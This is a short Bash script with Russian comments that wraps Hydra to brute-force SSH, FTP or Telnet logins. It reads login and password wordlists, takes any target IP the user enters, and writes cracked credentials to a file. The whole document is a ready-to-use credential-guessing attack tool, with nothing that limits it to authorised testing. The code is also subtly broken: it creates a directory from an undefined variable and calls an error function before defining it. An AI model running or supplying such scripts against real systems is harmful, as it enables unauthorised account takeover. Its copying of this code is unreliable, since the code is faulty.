# Проверка наличия утилиты Hydra
if ! command -v hydra &> /dev/null; then
    echo "Hydra is not installed. Please install it before using this script."
    exit 1
fi


output_directory="outputs"
output_file="bruter_out.txt"


# Создание директории, если она не существует
mkdir -p "$output_dir" || error_exit "Failed to create output directory: $output_dir"

# Функция для вывода сообщения об ошибке и выхода из скрипта
function error_exit {
    echo "Error: $1"
    exit 1
}

# Запрос пути к файлам с логинами и паролями
read -p "[+] Enter path to the login file: " login_file
read -p "[+] Enter path to the password file: " password_file

# Проверка существования файлов с логинами и паролями
[ -f "$login_file" ] || error_exit "Login file not found: $login_file"
[ -f "$password_file" ] || error_exit "Password file not found: $password_file"

# Запрос протокола и цели
read -p "[+] Enter the protocol (ssh, ftp, telnet): " protocol
read -p "[+] Enter the target (IP address): " target

# Запуск Hydra для брутфорса
echo "Bruteforce starting..."
hydra -f -L "$login_file" -P "$password_file" -o "$output_directory/$output_file" -e ns -v "$protocol://$target"
echo "BruteForce End!"
